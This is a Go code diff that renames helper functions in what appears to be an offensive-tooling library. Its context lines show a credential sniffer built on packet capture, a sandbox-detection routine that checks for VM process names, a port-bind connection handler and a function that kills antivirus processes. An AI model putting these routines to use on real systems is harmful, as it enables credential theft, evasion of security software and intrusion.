@@ -264,7 +264,7 @@ func SizeToBytes(size string) int {
 }
 
 func Alloc(size string) {
-	_ = make([]byte, size_to_bytes(size))
+	_ = make([]byte, SizeToBytes(size))
 }
 
 func IntervalToSeconds(interval string) int {
@@ -380,7 +380,7 @@ func RandomString(n int) string {
 
 func ExitOnError(e error) {
 	if e != nil {
-		print_error(e.Error())
+		PrintError(e.Error())
 		os.Exit(0)
 	}
 }
@@ -510,7 +510,7 @@ func Ifaces() []string {
 }
 
 func Info() map[string]string {
-	_, mac := iface()
+	_, mac := Iface()
 	u := ""
 	ap_ip := ""
 	i := goInfo.GetInfo()
@@ -766,7 +766,7 @@ func CmdRun(command string) {
 	cmd := exec.Command(head, parts...)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		print_error(err.Error())
+		PrintError(err.Error())
 		fmt.Println(string(output))
 		//fmt.Println(red(err.Error()) + ": " + string(output))
 	} else {
@@ -860,7 +860,7 @@ func CredentialsSniff(ifac, interval string,
 		hits = append(hits, strings.ToUpper(string(hit[0]))+string(hit[1:]))
 	}
 	var snapshot_len int32 = 1024
-	var timeout time.Duration = time.Duration(interval_to_seconds(interval)) * time.Second
+	var timeout time.Duration = time.Duration(IntervalToSeconds(interval)) * time.Second
 	for _, i := range ifs {
 		handler, err := pcap.OpenLive(i, snapshot_len, false, timeout)
 		if err != nil {
@@ -923,7 +923,7 @@ func SandboxProc() bool {
 		`vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}
 	p, _ := Processes()
 	for _, name := range p {
-		if contains_any(name, sandbox_processes) {
+		if ContainsAny(name, sandbox_processes) {
 			return true
 		}
 	}
@@ -1117,7 +1117,7 @@ func Bind(port int) {
 	for {
 		conn, err := listen.Accept()
 		if err != nil {
-			print_error("Cannot bind to selected port")
+			PrintError("Cannot bind to selected port")
 		}
 		_handle_bind(conn)
 	}
@@ -1183,7 +1183,7 @@ func PkillAv() error {
 		process = processList[x]
 		proc_name := process.Executable()
 		pid := process.Pid()
-		if contains_any(proc_name, av_processes) {
+		if ContainsAny(proc_name, av_processes) {
 			err := _kill_proc_by_pid(pid)
 			if err != nil {
 				return err
@@ -1320,7 +1320,7 @@ func Users() ([]string, error) {
 		lines := strings.Split(o, "\n")
 		for l := range lines {
 			line := lines[l]
-			if !contains_any(line, []string{"accounts for", "------", "completed"}) {
+			if !ContainsAny(line, []string{"accounts for", "------", "completed"}) {
 				clear = append(clear, line)
 			}
 		}
@@ -1486,7 +1486,7 @@ func WifiDisconnect() error {
 			return err
 		}
 	case "linux":
-		iface, _ := iface()
+		iface, _ := Iface()
 		cmd = f("ip link set dev %s down", iface)
 		_, err := CmdOut(cmd)
 		if err != nil {
